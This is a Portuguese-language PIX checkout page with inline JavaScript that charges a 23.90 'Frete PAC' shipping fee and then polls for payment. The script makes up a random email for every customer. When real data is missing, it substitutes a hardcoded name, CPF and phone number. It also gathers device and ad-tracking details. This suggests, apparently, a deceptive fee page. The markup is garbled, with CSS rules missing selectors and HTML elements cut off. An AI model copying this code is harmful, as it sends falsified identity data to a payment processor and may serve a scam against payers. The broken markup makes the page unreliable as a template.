<head>    <meta charset="UTF-8">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;

            min-height: 100vh;

            padding: 0;
        }        .header {
            background: #ffffff;
            padding: 12px 20px;

        }

        .main-content {
            display: flex;
            align-items: center;

            min-height: calc(100vh - 59px);
            padding: 20px;

        .container {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #e9ecef;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            text-align: center;
        }

        h1 {
            color: #2c3e50;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
        }

        .pix-code-container {
            background: #f8f9fa;
            border: 2px dashed #dee2e6;
            border-radius: 12px;

            display: flex;
            align-items: center;

        }

        .loading {
            color: #6c757d;
            font-style: italic;
        }

        .copy-button {
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .copy-button:hover {
            background: #3367d6;
            transform: translateY(-2px);
            box-shadow: 0 8px 16px rgba(66, 133, 244, 0.3);
        }

        .copy-button:active {
            transform: translateY(0);
        }

        .copy-button:disabled {
            background: #e9ecef;
            color: #6c757d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .timer {
            font-size: 36px;
            font-weight: 700;
            color: #e74c3c;
            margin-bottom: 30px;
        }

        .instructions-section h2 {
            color: #2c3e50;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .instruction {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 20px;
            text-align: left;
        }

        .instruction-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #e8f5e8;
            border: 2px solid #28a745;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .instruction-icon.pending {
            background: #f8f9fa;
            border-color: #dee2e6;
        }

        .instruction-text {
            color: #495057;
            line-height: 1.5;
            font-size: 16px;
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
        }        @media (max-width: 480px) {
            .header {
                padding: 10px 15px;
            }
            
            .header img {
                max-height: 24px;
            }
            
            .main-content {
                min-height: calc(100vh - 50px);
                padding: 15px;
            }
            
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .pix-code {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="image/image.png" alt="Logo" />
    </div>
    
    <div class="main-content">
        <div class="container">
        <h1>Finalize o pagamento</h1>
        
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
        
        <div class="pix-code-container">

        </div>
        
        <button class="copy-button" id="copyButton" disabled>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="currentColor"/>

        <div class="instructions-section">

            <div class="instruction">

                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">

    <script>
        // Função para gerar email aleatório
        function generateRandomEmail() {
            const domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'];
            const randomString = Math.random().toString(36).substring(2, 10);
            const randomDomain = domains[Math.floor(Math.random() * domains.length)];
            return `${randomString}@${randomDomain}`;
        }

        // Função para formatar telefone brasileiro para exibição
        function formatPhoneForDisplay(phone) {
            // Remove todos os caracteres não numéricos
            const cleanPhone = phone.replace(/\D/g, '');
            
            // Verifica se o telefone tem o formato correto
            if (cleanPhone.length === 10) {
                // Formato: (XX) XXXX-XXXX
                return cleanPhone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
            } else if (cleanPhone.length === 11) {
                // Formato: (XX) 9XXXX-XXXX
                return cleanPhone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            } else if (cleanPhone.length === 13 && cleanPhone.startsWith('55')) {
                // Remove código do país +55 e formata
                const phoneWithoutCountryCode = cleanPhone.substring(2);
                if (phoneWithoutCountryCode.length === 10) {
                    return phoneWithoutCountryCode.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
                } else if (phoneWithoutCountryCode.length === 11) {
                    return phoneWithoutCountryCode.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
                }
            }
            
            // Se não conseguir formatar, retorna apenas os números
            return cleanPhone;
        }        // Função para limpar telefone para API (apenas números)
        function cleanPhoneForAPI(phone) {
            // Remove todos os caracteres não numéricos
            let cleanPhone = phone.replace(/\D/g, '');
            
            // Remove código do país +55 se presente
            if (cleanPhone.length === 13 && cleanPhone.startsWith('55')) {
                cleanPhone = cleanPhone.substring(2);
            }
            
            // Garante que o telefone tenha 10 ou 11 dígitos
            if (cleanPhone.length === 10 || cleanPhone.length === 11) {
                return cleanPhone;
            }
            
            // Se não estiver no formato correto, usar telefone padrão
            console.warn('Telefone inválido:', phone, 'Usando padrão: 17992666990');
            return '17992666990';
        }

        // Função para validar CPF
        function validarCPF(cpf) {
            // Remove caracteres não numéricos
            cpf = cpf.replace(/\D/g, '');
            
            // Verifica se tem 11 dígitos
            if (cpf.length !== 11) return false;
            
            // Verifica se todos os dígitos são iguais
            if (/^(\d)\1+$/.test(cpf)) return false;
            
            // Validação do primeiro dígito verificador
            let soma = 0;
            for (let i = 0; i < 9; i++) {
                soma += parseInt(cpf.charAt(i)) * (10 - i);
            }
            let digito1 = 11 - (soma % 11);
            if (digito1 > 9) digito1 = 0;
            
            // Validação do segundo dígito verificador
            soma = 0;
            for (let i = 0; i < 10; i++) {
                soma += parseInt(cpf.charAt(i)) * (11 - i);
            }
            let digito2 = 11 - (soma % 11);
            if (digito2 > 9) digito2 = 0;
            
            // Verifica se os dígitos calculados coincidem com os informados
            return digito1 === parseInt(cpf.charAt(9)) && digito2 === parseInt(cpf.charAt(10));        }        // Função para obter parâmetros do usuário do localStorage
        function getUrlParams() {
            // Buscar dados do localStorage usando a sintaxe correta
            const userName = localStorage.getItem('userName');
            const userCpf = localStorage.getItem('userCpf');
            const userPhone = localStorage.getItem('userPhone');
            const userEmail = localStorage.getItem('userEmail');
            
            // Fallback para URL params se localStorage não tiver dados
            const urlParams = new URLSearchParams(window.location.search);
            
            const rawPhone = userPhone || urlParams.get('phone') || '17991456789';
            const rawCpf = userCpf || urlParams.get('cpf') || '45317828791';
            const name = userName || urlParams.get('name') || 'Jair Bolsonaro';
            
            // Validar CPF e usar padrão se inválido
            const cpfValido = validarCPF(rawCpf) ? rawCpf : '45317828791';
            
            console.log('📋 Dados do usuário recuperados (PAC):');
            console.log('- Nome (localStorage):', userName);
            console.log('- CPF (localStorage):', userCpf);
            console.log('- Telefone (localStorage):', userPhone);
            console.log('- Email (localStorage):', userEmail);
            console.log('- CPF válido:', validarCPF(rawCpf), 'CPF final:', cpfValido);
            console.log('- Telefone original:', rawPhone);
            
            return {
                name: name,
                phone: cleanPhoneForAPI(rawPhone), // Apenas números para API
                phoneDisplay: formatPhoneForDisplay(rawPhone), // Formatado para exibição
                cpf: cpfValido
            };
        }

        // Função para capturar parâmetros UTM e informações adicionais de tracking        // Função para capturar parâmetros UTM e informações adicionais de tracking
        function getUtmParams() {
            // Primeiro, tentar buscar parâmetros de tracking do localStorage
            const trackingParams = JSON.parse(localStorage.getItem('trackingParams') || '{}');
            
            // Também capturar da URL atual (para casos onde o usuário venha diretamente)
            const urlParams = new URLSearchParams(window.location.search);
            const trackingData = { ...trackingParams }; // Começar com dados do localStorage
            
            // Parâmetros UTM essenciais para Facebook Ads
            const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
            
            // Capturar parâmetros UTM (URL tem prioridade)
            utmKeys.forEach(key => {
                const value = urlParams.get(key);
                if (value) {
                    trackingData[key] = value;
                }
            });

            // Parâmetros críticos do Facebook para tracking de conversões
            const facebookParams = [
                'fbc',          // Facebook Click ID
                'fbp',          // Facebook Browser ID
                'fbclid',       // Facebook Click Identifier
                'fb_action_ids', // IDs de ação do Facebook
                'fb_action_types', // Tipos de ação do Facebook
                'fb_source'     // Fonte do Facebook
            ];
            
            facebookParams.forEach(param => {
                const value = urlParams.get(param);
                if (value) {
                    trackingData[param] = value;
                }
            });

            // Capturar também parâmetros do Google Ads para tracking completo
            const googleParams = ['gclid', 'gclsrc', 'dclid'];
            googleParams.forEach(param => {
                const value = urlParams.get(param);
                if (value) {
                    trackingData[param] = value;
                }
            });

            // Adicionar informações do browser e sessão (importantes para Facebook)
            trackingData.user_agent = navigator.userAgent;
            trackingData.timestamp = new Date().toISOString();
            trackingData.referrer = document.referrer || 'direct';
            trackingData.page_url = window.location.href;
            
            // Informações de tela e dispositivo (úteis para segmentação)
            trackingData.screen_width = screen.width;
            trackingData.screen_height = screen.height;
            trackingData.viewport_width = window.innerWidth;
            trackingData.viewport_height = window.innerHeight;
            
            // Detectar se é mobile (importante para Facebook)
            trackingData.is_mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            // Idioma do browser
            trackingData.language = navigator.language || navigator.userLanguage;
            
            // Timezone
            trackingData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Tentar capturar o Facebook Pixel ID se disponível no localStorage
            try {
                const fbPixelData = localStorage.getItem('_fbp');
                if (fbPixelData) {
                    trackingData.fb_pixel_data = fbPixelData;
                }
            } catch (e) {
                // Ignorar erro se localStorage não estiver disponível
            }

            console.log('🎯 Dados de tracking capturados para Facebook Ads:', JSON.stringify(trackingData, null, 2));
            
            // Sempre retornar os dados, mesmo que não tenha UTMs (informações do browser são valiosas)
            return trackingData;
        }

        // Função para gerar identificador aleatório
        function generateRandomId(length = 10) {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }        // Função para gerar código PIX
        async function generatePixCode() {
            try {
                const params = getUrlParams();
                const email = generateRandomEmail();
                const utmParams = getUtmParams();
                  console.log('Telefone limpo para API:', params.phone);
                console.log('Telefone formatado para exibição:', params.phoneDisplay);
                console.log('🔍 Validando dados antes de enviar:');
                console.log('- Nome:', params.name);
                console.log('- Email:', email);
                console.log('- Telefone (limpo):', params.phone);
                console.log('- CPF:', params.cpf);
                
                // Validar se todos os campos obrigatórios estão presentes
                if (!params.name || !email || !params.phone || !params.cpf) {
                    throw new Error('Dados obrigatórios estão faltando');
                }
                  const requestData = {
                    identifier: generateRandomId(),
                    amount: 23.9,                    client: {
                        name: params.name,
                        email: email,
                        phone: params.phone, // Usar telefone limpo (apenas números)
                        document: params.cpf
                    },
                    products: [
                        {
                            id: generateRandomId(12),
                            name: "PAC",
                            quantity: 1,
                            price: 23.9
                        }
                    ],
                    callbackUrl: `${window.location.origin}/webhook/duckfy`
                };// Sempre adicionar trackProps para otimizar tracking do Facebook Ads
                requestData.trackProps = utmParams;
                console.log('✅ TrackProps adicionados para Facebook Ads:', JSON.stringify(utmParams, null, 2));

                console.log('📤 Dados completos sendo enviados para Duckfy:', JSON.stringify(requestData, null, 2));const response = await fetch('/api/pix', {
                    method: 'POST',
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(requestData)
                });

                console.log('Status da resposta:', response.status);

                if (!response.ok) {
                    const errorText = await response.text();
                    console.error('Erro da API:', errorText);
                    throw new Error(`Erro na API: ${response.status} - ${errorText}`);
                }                const data = await response.json();
                console.log('Resposta da API:', data);
                  if ((data.status === 'OK' || data.status === 'PENDING') && data.pix && data.pix.code) {                    document.getElementById('pixCode').textContent = data.pix.code;
                    document.getElementById('pixCode').classList.remove('loading');
                    document.getElementById('copyButton').disabled = false;
                    showSuccess('Código PIX gerado com sucesso!');
                    markStepCompleted('step1');
                    
                    // 🎯 Facebook Pixel: Rastrear geração do PIX como AddPaymentInfo
                    if (typeof trackAddPaymentInfo === 'function') {
                        trackAddPaymentInfo('Frete PAC', 23.9);
                    }
                    
                    // Salvar dados da transação para consulta posterior
                    if (data.transactionId) {
                        localStorage.setItem('transactionId', data.transactionId);
                        // Iniciar detecção robusta de pagamento
                        startPaymentDetection(data.transactionId);
                    }
                    if (data.order && data.order.id) {
                        localStorage.setItem('orderId', data.order.id);
                    }
                    
                    // Iniciar detecção de pagamento em tempo real
                    startPaymentDetection();
                } else {
                    throw new Error(`Status da resposta: ${data.status}. Código PIX não encontrado na resposta.`);
                }

            } catch (error) {
                console.error('Erro ao gerar código PIX:', error);
                document.getElementById('pixCode').textContent = 'Erro ao gerar código PIX';
                document.getElementById('pixCode').classList.remove('loading');
                showError(`Erro ao gerar código PIX: ${error.message}`);
            }
        }

        // Função para copiar código PIX
        function copyPixCode() {
            const pixCode = document.getElementById('pixCode').textContent;
            
            if (pixCode && !pixCode.includes('Erro') && !pixCode.includes('Gerando')) {
                navigator.clipboard.writeText(pixCode).then(() => {
                    showSuccess('Código copiado com sucesso!');
                    markStepCompleted('step2');
                    document.getElementById('copyButton').textContent = 'CÓDIGO COPIADO!';
                    setTimeout(() => {
                        document.getElementById('copyButton').innerHTML = `
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="currentColor"/>
                            </svg>
                            COPIAR CÓDIGO
                        `;
                    }, 2000);
                }).catch(() => {
                    showError('Erro ao copiar código. Tente selecionar e copiar manualmente.');
                });
            }
        }

        // Função para mostrar mensagem de erro
        function showError(message) {
            const errorElement = document.getElementById('errorMessage');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            document.getElementById('successMessage').style.display = 'none';
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }

        // Função para mostrar mensagem de sucesso
        function showSuccess(message) {
            const successElement = document.getElementById('successMessage');
            successElement.textContent = message;
            successElement.style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 3000);
        }

        // Função para marcar passo como concluído
        function markStepCompleted(stepId) {
            const step = document.getElementById(stepId);
            step.classList.remove('pending');
        }

        // Timer de 30 minutos
        function startTimer() {
            let timeLeft = 30 * 60; // 30 minutos em segundos
            
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                document.getElementById('timer').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    showError('Tempo expirado! Recarregue a página para gerar um novo código.');
                    document.getElementById('copyButton').disabled = true;
                }
                
                timeLeft--;
            }, 1000);
        }        // Variáveis globais para controle
        let paymentDetectionActive = false;
        let currentTransactionId = null;
        let sseConnection = null;
        let pollingInterval = null;

        // Função para gerar ID de sessão único
        function generateSessionId() {
            return 'session_' + Math.random().toString(36).substring(2) + '_' + Date.now();
        }

        // Função principal para detectar pagamentos (híbrida: SSE + Polling)
        function startPaymentDetection(transactionId) {
            if (paymentDetectionActive) {
                console.log('Detecção de pagamento já está ativa');
                return;
            }

            if (!transactionId) {
                console.error('TransactionId é obrigatório para detecção de pagamento');
                return;
            }

            paymentDetectionActive = true;
            currentTransactionId = transactionId;
            
            console.log('🚀 Iniciando detecção robusta de pagamento para:', transactionId);

            // Tentar SSE primeiro
            startSSEDetection();
            
            // Iniciar polling como fallback
            startPollingDetection();
            
            // Timeout geral de 30 minutos
            setTimeout(() => {
                if (paymentDetectionActive) {
                    console.log('⏰ Timeout de 30 minutos atingido - parando detecção');
                    stopPaymentDetection();
                }
            }, 30 * 60 * 1000);
        }

        // Detecção via Server-Sent Events
        function startSSEDetection() {
            try {
                const sessionId = generateSessionId();
                console.log('🔌 Conectando SSE:', sessionId);
                
                sseConnection = new EventSource(`/api/payment-status/${sessionId}`);
                
                sseConnection.onopen = function() {
                    console.log('✅ Conexão SSE estabelecida com sucesso');
                };
                
                sseConnection.onmessage = function(event) {
                    try {
                        const data = JSON.parse(event.data);
                        
                        if (data.type === 'payment_confirmed') {
                            console.log('🎉 Pagamento confirmado via SSE!', data);
                            handlePaymentConfirmed(data);
                        } else if (data.type === 'connected') {
                            console.log('🔌 SSE conectado:', data.sessionId);
                        } else if (data.type === 'heartbeat') {
                            console.log('💓 Heartbeat SSE recebido');
                        }
                    } catch (error) {
                        console.error('❌ Erro ao processar evento SSE:', error);
                    }
                };
                
                sseConnection.onerror = function(error) {
                    console.error('❌ Erro na conexão SSE:', error);
                    
                    // Tentar reconectar após 10 segundos se ainda estiver ativo
                    if (paymentDetectionActive) {
                        setTimeout(() => {
                            if (paymentDetectionActive && (!sseConnection || sseConnection.readyState === EventSource.CLOSED)) {
                                console.log('🔄 Tentando reconectar SSE...');
                                startSSEDetection();
                            }
                        }, 10000);
                    }
                };
                
            } catch (error) {
                console.error('❌ Erro ao iniciar SSE:', error);
            }
        }

        // Detecção via Polling (fallback)
        function startPollingDetection() {
            if (!currentTransactionId) return;
            
            console.log('🔄 Iniciando polling de fallback para:', currentTransactionId);
            
            pollingInterval = setInterval(async () => {
                if (!paymentDetectionActive) {
                    clearInterval(pollingInterval);
                    return;
                }
                
                try {
                    console.log('🔍 Verificando status via polling...');
                    
                    const response = await fetch(`/api/payment-check/${currentTransactionId}`);
                    const data = await response.json();
                    
                    if (data.found && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.status === 'COMPLETED')) {
                        console.log('🎉 Pagamento confirmado via polling!', data);
                        handlePaymentConfirmed(data);
                    }
                } catch (error) {
                    console.error('❌ Erro no polling:', error);
                }
            }, 10000); // Verifica a cada 10 segundos
        }

        // Parar toda detecção
        function stopPaymentDetection() {
            console.log('🛑 Parando detecção de pagamento');
            
            paymentDetectionActive = false;
            
            // Fechar SSE
            if (sseConnection) {
                sseConnection.close();
                sseConnection = null;
            }
            
            // Parar polling
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        // Função para lidar com pagamento confirmado
        function handlePaymentConfirmed(paymentData) {
            if (!paymentDetectionActive) {
                console.log('Detecção já foi finalizada, ignorando evento duplicado');
                return;
            }
            
            console.log('🎊 Processando pagamento confirmado:', paymentData);
              // Parar toda detecção primeiro
            stopPaymentDetection();
            
            // 🎯 Facebook Pixel: Rastrear compra concluída
            const transactionId = paymentData.transactionId || localStorage.getItem('transactionId') || 'unknown';
            if (typeof trackPurchase === 'function') {
                trackPurchase(transactionId, 'Frete PAC', 23.9);
            }
            
            // Atualizar interface
            showSuccess('🎉 Pagamento confirmado! Redirecionando em 3 segundos...');
            markStepCompleted('step3');
            
            // Atualizar botão
            const copyButton = document.getElementById('copyButton');
            copyButton.disabled = true;
            copyButton.textContent = '✅ PAGAMENTO CONFIRMADO!';
            copyButton.style.background = '#28a745';
            
            // Salvar dados
            localStorage.setItem('paymentConfirmed', 'true');
            localStorage.setItem('paymentData', JSON.stringify(paymentData));
            localStorage.setItem('redirectTime', new Date().toISOString());
              // Redirecionamento com countdown visual
            let countdown = 3;
            const countdownInterval = setInterval(() => {
                if (countdown > 0) {
                    showSuccess(`🎉 Pagamento confirmado! Redirecionando em ${countdown} segundos...`);
                    countdown--;
                } else {
                    clearInterval(countdownInterval);
                    console.log('🔀 Redirecionando para /ga/');
                    
                    // Capturar todos os parâmetros da URL atual para passar para /ga/
                    const currentParams = window.location.search;
                    const redirectUrl = currentParams ? `/ga/${currentParams}` : '/ga/';
                    
                    console.log('🔗 URL de redirecionamento:', redirectUrl);
                    window.location.href = redirectUrl;
                }
            }, 1000);
        }

        // Limpeza quando sair da página
        window.addEventListener('beforeunload', () => {
            stopPaymentDetection();
        });

        // ...existing code...

        // Event listeners
        document.getElementById('copyButton').addEventListener('click', copyPixCode);

        // Inicializar quando a página carregar
        document.addEventListener('DOMContentLoaded', () => {
            generatePixCode();
            startTimer();
            startPaymentDetection();
        });
    </script>
